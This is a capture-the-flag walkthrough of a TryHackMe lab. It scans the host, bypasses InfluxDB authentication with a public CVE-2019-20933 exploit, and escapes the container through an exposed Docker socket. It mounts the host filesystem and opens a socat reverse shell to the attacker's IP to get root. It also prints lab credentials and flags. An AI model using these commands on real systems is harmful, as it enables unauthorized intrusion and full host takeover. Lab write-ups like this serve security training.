# Sweettooth Inc. — Writeup

## Overview
### Sweettooth Inc. — Writeup
### Sweettooth Inc. — Writeup
----
Sweettooth Inc. needs your help to find out how secure their system is!
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/33632296aaf0a3545edaf9a386aade62.jpeg)

## Enumeration
Do a TCP portscan. What is the name of the database software running on one of these ports?
```text
┌──(witty㉿kali)-[~/Downloads/marshalsec/target]
└─$ rustscan -a 10.10.132.162 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.132.162:111
Open 10.10.132.162:2222
Open 10.10.132.162:8086
Open 10.10.132.162:49801
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.132.162 [4 ports]
Discovered open port 111/tcp on 10.10.132.162
Discovered open port 49801/tcp on 10.10.132.162
Discovered open port 8086/tcp on 10.10.132.162
Discovered open port 2222/tcp on 10.10.132.162
Completed Connect Scan (4 total ports)
Initiating Service scan
Scanning 4 services on 10.10.132.162
Completed Service scan (4 services on 1 host)
NSE: Script scanning 10.10.132.162.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.132.162
Host is up, received user-set (0.18s latency).

PORT      STATE SERVICE REASON  VERSION
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34576/tcp6  status
|   100024  1          46825/udp6  status
|   100024  1          49801/tcp   status
|_  100024  1          52005/udp   status
2222/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0cec921658994527648ced8c8fcd4ec (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALOlP9Bx9VQxs4JDY8vovlJp+l+pPX2MGttzN2gGNYABXAVSF9CA14OituA5tcJd5/Nv3Ru3Xyu8Yo5SV0d82rd7L/NF5Relx+iiVF+bigo329wbV3wsIrRQGUYHXiMjAs8WqQR+XKjOm3q4QLVxe/jU1I1ddy6/xO4fL7nOSh3RAAAAFQDKuQDe9pQtmnqvJkZ7QuCGm31+vQAAAIBENh/MS3oHvz1tCC4nZYwdAYZMBj2It0gYCMvD0oSkqL9IMaP9DIt/5G3D9ARrZPeSP4CqhfryIGHS7t59RNdnc3ukEsfJPo23bPBwWdIW7HXp9XDqyY1kD6L3Tq0bpeXpeXt6FQ93rFxncZngFkCrMD4+YytS532qPHMPOWh75gAAAIA7TohVech8kWTh6KIMl2Y61s9cwUqwrTkqJIYMdZ73nP69FD0bw08vyrdAwtVnsqRaNzsVVz9sBOOz3wmp/ZNI5NiuyA0UwEcxPj5k6jCn620gBpMEzVy6a8Ih3yRYHoiVMrQ/PIuoeIGxeYGckCorv8jSz2O3pq1Fnz23FRPH2A==
|   2048 7e8688fe424e94480aaadaab34613c6e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbBmLBPg9mxkAdEbJGnz0v6Jzo4qdBcajkaIBKewKyz6OQTvyhVcDReSB2Dz0nl4mPCs3UN58hSNStCYXjZcpIBpqz2pHupVlqQ7u41Vo2W8u0nVFLt2U8JhTtA9wE6MA9GhitkN3Qorhxb3klCpSnWCDdcmkdNL0EYxZV53A52VWiNGX3vYkdMAKHAmp/VHvrsIeHozqflL8vD2UIoDmxDJwgXJRsr2iGVU1fL/Bu/DwlPwJkm50ua99yPpZbvCS9EwWki76aEtZSbcM4WHzx33Oe3tLXLCfKc9CJdIW35nBvpe5Dxl7gLR/mCHp2iTpdx1FmpSf+JjO/m2vKwL4X
|   256 041c82f6a67453c9c46f25374cbf8ba8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHufHfqIZHVEKYC/yyNS+vTt35iULiIWoFNSQP/Bm/v90QzZjsYU9MSt7xdlR/2LZp9VWk32nl5JL65tvCMImxc=
|   256 494bdce60407b6d5abc0b0a3428e87b5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEYHtE8GbpGSlNB+/3IWfYRFrkJB+N9SmKs3Uh14pPj
8086/tcp  open  http    syn-ack InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
49801/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.75 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ influx
Command 'influx' not found, but can be installed with:
sudo apt install influxdb-client
Do you want to install it? (N/y)y
```
*InfluxDB*

## Privilege Escalation
```text
uzJk6Ry98d8C@ed2300f3fc23:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
uzJk6Ry98d8C@ed2300f3fc23:~$ ls -lah /run/docker.sock
srw-rw-rw- 1 root influxdb 0 Jul  9 02:19 /run/docker.sock

uzJk6Ry98d8C@ed2300f3fc23:~$ cat /entrypoint.sh
#!/bin/bash
set -e

if [ "${1:0:1}" = '-' ]; then
    set -- influxd "$@"
fi

exec "$@"

uzJk6Ry98d8C@ed2300f3fc23:~$ cat /initializeandquery.sh
#!/bin/bash
```
```text
# wait for influx port to be open
while ! timeout 1 /bin/bash -c "echo > /dev/tcp/localhost/8086"; do   
  sleep 10
done

influx -execute "create user o5yY6yya with password 'mJjeQ44e2unu' with all privileges"
influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database creds"
influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database docker"

starting_utc_timestamp=1621166400

influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into creds.autogen ssh,user=uzJk6Ry98d8C pw=7788764472 $starting_utc_timestamp"

influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database tanks"
influx -username o5yY6yya -password mJjeQ44e2unu -execute "create database mixer"

############################################
```
```text
# setup measurements
############################################
```
```text
# sugar_tank
timestamp_sugar_tank=$starting_utc_timestamp
for i in {1..100}
do
  random_filling_height=$(seq 49 .01 62 | shuf | head -n1)
  random_temperature=$(seq 23 .01 24 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen sugar_tank filling_height=$random_filling_height,temperature=$random_temperature $timestamp_sugar_tank"
  timestamp_sugar_tank=$((timestamp_sugar_tank+3600))
  sleep 0.1
done
```
```text
# gelatin_tank
timestamp_gelatin_tank=$starting_utc_timestamp
for i in {1..100}
do
  random_filling_height1=$(seq 60 .01 70 | shuf | head -n1)
  random_temperature1=$(seq 22 .01 25 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen gelatin_tank filling_height=$random_filling_height1,temperature=$random_temperature1 $timestamp_gelatin_tank"
  timestamp_gelatin_tank=$((timestamp_gelatin_tank+3600))
  sleep 0.1
done
```
```text
# water_tank
timestamp_water_tank=$starting_utc_timestamp
for i in {1..50}
do
  random_filling_height2=$(seq 92 .01 95 | shuf | head -n1)
  random_temperature2=$(seq 20 .01 24 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen water_tank filling_height=$random_filling_height2,temperature=$random_temperature2 $timestamp_water_tank"
  timestamp_water_tank=$((timestamp_water_tank+3600))
  sleep 0.1
done
```
```text
# special value at number 51!
influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen water_tank filling_height=$random_filling_height2,temperature=22.50 $timestamp_water_tank"
timestamp_water_tank=$((timestamp_water_tank+3600))
for i in {1..49}
do
  random_filling_height2=$(seq 92 .01 95 | shuf | head -n1)
  random_temperature2=$(seq 20 .01 24 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen water_tank filling_height=$random_filling_height2,temperature=$random_temperature2 $timestamp_water_tank"
  timestamp_water_tank=$((timestamp_water_tank+3600))
  sleep 0.1
done
```
```text
# fruitjuice_tank
timestamp_fruitjuice_tank=$starting_utc_timestamp
for i in {1..100}
do
  random_filling_height3=$(seq 88 .01 90 | shuf | head -n1)
  random_temperature3=$(seq 21 .01 22 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into tanks.autogen fruitjuice_tank filling_height=$random_filling_height3,temperature=$random_temperature3 $timestamp_fruitjuice_tank"
  timestamp_fruitjuice_tank=$((timestamp_fruitjuice_tank+3600))
  sleep 0.1
done
```
```text
# mixer
timestamp_mixer_tank=$starting_utc_timestamp
for i in {1..99}
do
  random_motor_rpm=$(seq 4000 2 4874 | shuf | head -n1)
  random_filling_height4=$(seq 57 .01 65 | shuf | head -n1)
  random_temperature4=$(seq 60 .01 75 | shuf | head -n1)
  influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into mixer.autogen mixer_stats filling_height=$random_filling_height4,motor_rpm=$random_motor_rpm,temperature=$random_temperature4 $timestamp_mixer_tank"
  timestamp_mixer_tank=$((timestamp_mixer_tank+3600))
  sleep 0.1
done
```
```text
# at last, special value!
influx -username o5yY6yya -password mJjeQ44e2unu -precision s -execute "insert into mixer.autogen mixer_stats filling_height=$random_filling_height4,motor_rpm=4875,temperature=$random_temperature4 $timestamp_mixer_tank"

####################################################################################
####################################################################################

socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &
```
```text
# query each 5 seconds and write docker statistics to database
while true; do
  curl -o /dev/null -G http://localhost:8086/query?pretty=true --data-urlencode "q=show databases" --data-urlencode "u=o5yY6yya" --data-urlencode "p=mJjeQ44e2unu"
  sleep 5
  response="$(curl localhost:8080/containers/json)"
  containername=`(jq '.[0].Names' <<< "$response") | jq .[0] | grep -Eo "[a-zA-Z]+"`
  status=`jq '.[0].State' <<< "$response"`
  influx -username o5yY6yya -password mJjeQ44e2unu -execute "insert into docker.autogen stats containername=\"$containername\",stats=\"$status\""
done

This script reveals that the **port 8080 is being used for querying the InfluxDB docker container.**

uzJk6Ry98d8C@ed2300f3fc23:~$ curl localhost:8080/containers/json
[{"Id":"ed2300f3fc237928cfbb1b207c0a17584129cb69f3fa670d2c30f0a69d73f5d6","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1688869197,"Ports":[{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up About an hour","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"d9d0796d6e00d3c9e8ca693fbe3fd3740d53fa83cc28ca8ee1dd4e0060304ff0","EndpointID":"7f7275f8e30da8f5d31772963bb3bc74949604ac8d5dfce82de17b3853557292","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"},{"Type":"volume","Name":"23e39eaa35e94a5946601dfb336d21891fe972d72c30ef2f6c0b365bc03891d1","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""}]}]

https://dejandayoff.com/the-danger-of-exposing-docker.sock/

uzJk6Ry98d8C@ed2300f3fc23:~$ hostname
ed2300f3fc23

uzJk6Ry98d8C@ed2300f3fc23:~$ curl -i -s -X GET http://localhost:8080/containers/json
HTTP/1.1 200 OK
Api-Version: 1.38
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
Date: Sun, 09 Jul 2023 03:12:17 GMT
Content-Length: 1396

[{"Id":"ed2300f3fc237928cfbb1b207c0a17584129cb69f3fa670d2c30f0a69d73f5d6","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e","Command":"/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''","Created":1688869197,"Ports":[{"IP":"0.0.0.0","PrivatePort":22,"PublicPort":2222,"Type":"tcp"},{"IP":"0.0.0.0","PrivatePort":8086,"PublicPort":8086,"Type":"tcp"}],"Labels":{},"State":"running","Status":"Up About an hour","HostConfig":{"NetworkMode":"default"},"NetworkSettings":{"Networks":{"bridge":{"IPAMConfig":null,"Links":null,"Aliases":null,"NetworkID":"d9d0796d6e00d3c9e8ca693fbe3fd3740d53fa83cc28ca8ee1dd4e0060304ff0","EndpointID":"7f7275f8e30da8f5d31772963bb3bc74949604ac8d5dfce82de17b3853557292","Gateway":"172.17.0.1","IPAddress":"172.17.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:11:00:02","DriverOpts":null}}},"Mounts":[{"Type":"volume","Name":"23e39eaa35e94a5946601dfb336d21891fe972d72c30ef2f6c0b365bc03891d1","Source":"","Destination":"/var/lib/influxdb","Driver":"local","Mode":"","RW":true,"Propagation":""},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]}]

we found the image name is `sweettoothinc`

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ cat evil.json                                
{
 "Image":"sweettoothinc",
 "cmd":["/bin/bash"],
 "Binds": [
  "/:/mnt:rw"
 ]
}

When we start this evil container, `/bin/bash` will run, and mount the entire file system to `/mnt` directory. So we’ll have access to all the files of the host machine with full read/write access (`rw`)

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.132.162 - - [08/Jul/2023 23:16:12] "GET /evil.json HTTP/1.1" 200 -

uzJk6Ry98d8C@ed2300f3fc23:~$ cd /tmp
uzJk6Ry98d8C@ed2300f3fc23:/tmp$ wget http://10.8.19.103:1234/evil.json
converted 'http://10.8.19.103:1234/evil.json' (ANSI_X3.4-1968) -> 'http://10.8.19.103:1234/evil.json' (UTF-8)
--  http://10.8.19.103:1234/evil.json
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 81 [application/json]
Saving to: 'evil.json'

evil.json                100%[===================================>]      81  --.-KB/s   in 0.001s 

(113 KB/s) - 'evil.json' saved [81/81]

Upload our evil container

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ curl -X POST -H "Content-Type: application/json" -d @evil.json http://localhost:8080/containers/create
{"Id":"5debc1bdaeec548ff28bf2bd2048685131371bf98225fb82bfe3e030bc14e8a6","Warnings":null}

- Container ID: `182b4d536f528d540852dcf67e72e770f7d40f4c181cc5c3b7adc6bf34844490`

Start the evil container

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ curl -X POST http://localhost:8080/containers/5debc1bdaeec548ff28bf2bd2048685131371bf98225fb82bfe3e030bc14e8a6/start

If no output means it started successfully.

Create an exec instance, which allows us to execute arbitrary commands inside the evil container

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ which socat
/usr/bin/socat

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
 socat[486873] N opening character device "/dev/pts/5" for reading and writing
 socat[486873] N listening on AF=2 0.0.0.0:4444

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["socat" ,"TCP:10.8.19.103:4444", "EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost:8080/containers/5debc1bdaeec548ff28bf2bd2048685131371bf98225fb82bfe3e030bc14e8a6/exec
HTTP/1.1 201 Created
Api-Version: 1.38
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
Date: Sun, 09 Jul 2023 03:22:19 GMT
Content-Length: 74

{"Id":"cc052d9e9364a75d6170cb122e10e8563d29a23a5e05be66a1bd82b14c296273"}

- Exec ID: `cc052d9e9364a75d6170cb122e10e8563d29a23a5e05be66a1bd82b14c296273`

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:8080/exec/cc052d9e9364a75d6170cb122e10e8563d29a23a5e05be66a1bd82b14c296273/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.38
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
 socat[486873] N opening character device "/dev/pts/5" for reading and writing
 socat[486873] N listening on AF=2 0.0.0.0:4444
  socat[486873] N accepting connection from AF=2 10.10.132.162:54816 on AF=2 10.8.19.103:4444
                 socat[486873] N starting data transfer loop with FDs [5,5] and [7,7]
        root@5debc1bdaeec:/# whoami;hostname;id;ip a
root
5debc1bdaeec
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
8: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

**Check it is mounted or not**

root@5debc1bdaeec:/# ls -lah /mnt
total 92K
drwxr-xr-x  22 root root 4.0K May 15  2021 .
drwxr-xr-x  60 root root 4.0K Jul  9 03:20 ..
drwxr-xr-x   2 root root 4.0K May 15  2021 bin
drwxr-xr-x   3 root root 4.0K May 15  2021 boot
drwxr-xr-x  16 root root 2.9K Jul  9 02:19 dev
drwxr-xr-x 137 root root  12K Jul  9 03:11 etc
drwxr-xr-x   3 root root 4.0K May 15  2021 home
lrwxrwxrwx   1 root root   32 May 15  2021 initrd.img -> /boot/initrd.img-3.16.0-11-amd64
lrwxrwxrwx   1 root root   31 May 15  2021 initrd.img.old -> /boot/initrd.img-3.16.0-4-amd64
drwxr-xr-x  18 root root 4.0K May 15  2021 lib
drwxr-xr-x   2 root root 4.0K May 15  2021 lib64
drwx------   2 root root  16K May 15  2021 lost+found
drwxr-xr-x   3 root root 4.0K May 15  2021 media
drwxr-xr-x   2 root root 4.0K May 15  2021 mnt
drwxr-xr-x   2 root root 4.0K May 15  2021 opt
dr-xr-xr-x 111 root root    0 Jul  9 02:18 proc
drwx------   2 root root 4.0K May 18  2021 root
drwxr-xr-x  22 root root  860 Jul  9 02:24 run
drwxr-xr-x   2 root root 4.0K May 15  2021 sbin
drwxr-xr-x   2 root root 4.0K May 15  2021 srv
dr-xr-xr-x  13 root root    0 Jul  9 02:41 sys
drwxrwxrwt   8 root root 4.0K Jul  9 03:23 tmp
drwxr-xr-x  10 root root 4.0K May 15  2021 usr
drwxr-xr-x  12 root root 4.0K May 15  2021 var
lrwxrwxrwx   1 root root   28 May 15  2021 vmlinuz -> boot/vmlinuz-3.16.0-11-amd64
lrwxrwxrwx   1 root root   27 May 15  2021 vmlinuz.old -> boot/vmlinuz-3.16.0-4-amd64

root@5debc1bdaeec:/# cd /root
root@5debc1bdaeec:/root# ls
root.txt
root@5debc1bdaeec:/root# cat root.txt 
THM{5qsDivHdCi2oabwp}
```
/root/root.txt
### Task 5  Escape!
The second /root/root.txt
```text
root@5debc1bdaeec:/root# cd /mnt
root@5debc1bdaeec:/mnt# ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
root@5debc1bdaeec:/mnt# cd root
root@5debc1bdaeec:/mnt/root# ls
root.txt
root@5debc1bdaeec:/mnt/root# cat root.txt
THM{nY2ZahyFABAmjrnx}

uzJk6Ry98d8C@ed2300f3fc23:/tmp$ cd /root
-bash: cd: /root: Permission denied
uzJk6Ry98d8C@ed2300f3fc23:/tmp$ exit
logout
```
### Task 6  Credits
This is a room by ripcurlz and ms.geeky. We hope you enjoyed it :)
Completed

## Flags / Answers
```text
- https://docs.influxdata.com/influxdb/v1.8/tools/shell/

┌──(witty㉿kali)-[~/Downloads]
└─$ influx -host 10.10.132.162 -port 8086
Connected to http://10.10.132.162:8086 version 1.3.0
InfluxDB shell version: 1.6.7~rc0
> help
Usage:
        connect <host:port>   connects to another node specified by host:port
        auth                  prompts for username and password
        pretty                toggles pretty print for the json format
        chunked               turns on chunked responses from server
        chunk size <size>     sets the size of the chunked responses.  Set to 0 to reset to the default chunked size
        use <db_name>         sets current database
        format <format>       specifies the format of the server responses: json, csv, or column
        precision <format>    specifies the format of the timestamp: rfc3339, h, m, s, ms, u or ns
        consistency <level>   sets write consistency level: any, one, quorum, or all
        history               displays command history
        settings              outputs the current settings for the shell
        clear                 clears settings such as database or retention policy.  run 'clear' for help
        exit/quit/ctrl+d      quits the influx shell

        show databases        show database names
        show series           show series information
        show measurements     show measurement information
        show tag keys         show tag key information
        show field keys       show field key information

        A full list of influxql commands can be found at:
        https://docs.influxdata.com/influxdb/latest/query_language/spec/

https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb

> use _internal
ERR: unable to parse authentication credentials
DB does not exist!

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 37 (delta 12), reused 14 (delta 4), pack-reused 0
Receiving objects: 100% (37/37), 10.58 KiB | 492.00 KiB/s, done.
Resolving deltas: 100% (12/12), done.
                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd InfluxDB-Exploit-CVE-2019-20933 
                                                                  
┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ ls
__main__.py  README.md  requirements.txt  users.txt
                                                                  
┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ pip install -r requirements.txt

https://www.komodosec.com/post/when-all-else-fails-find-a-0-day

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ curl http://10.10.132.162:8086/debug/requests
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}

- InfluxDB Username: o5yY6yya

┌──(witty㉿kali)-[~/Downloads/InfluxDB-Exploit-CVE-2019-20933]
└─$ python __main__.py             

  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
 - using CVE-2019-20933

Host (default: localhost): 10.10.132.162
Port (default: 8086): 8086
Username <OR> path to username file (default: users.txt): o5yY6yya
Host vulnerable !!!

Databases:

1) creds
2) docker
3) tanks
4) mixer
5) _internal

.quit to exit
[o5yY6yya@10.10.132.162] Database: 3

Starting InfluxDB shell - .back to go back

**Enumerate table names:**

[o5yY6yya@10.10.132.162/tanks] $ show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "fruitjuice_tank"
                        ],
                        [
                            "gelatin_tank"
                        ],
                        [
                            "sugar_tank"
                        ],
                        [
                            "water_tank"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

**Enumerate column names**

[o5yY6yya@10.10.132.162/tanks] $ show field keys
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "fruitjuice_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "gelatin_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "sugar_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                },
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "water_tank",
                    "values": [
                        [
                            "filling_height",
                            "float"
                        ],
                        [
                            "temperature",
                            "float"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

- Database `tanks` table names: `fruitjuice_tank`, `gelatin_tank`, `sugar_tank`, `water_tank`

[Unix Time Stamp - Epoch Converter](https://www.unixtimestamp.com/?unixTimestampInput=%7B%7B%7Bs%7D%7D%7D)

|   |
|---|
|Tue May 18 2021 14:00:00 GMT+0000|

 [
                            "2021-05-18T14:00:00Z",
                            22.5
                        ],

[o5yY6yya@10.10.132.162/tanks] $ SELECT temperature FROM water_tank
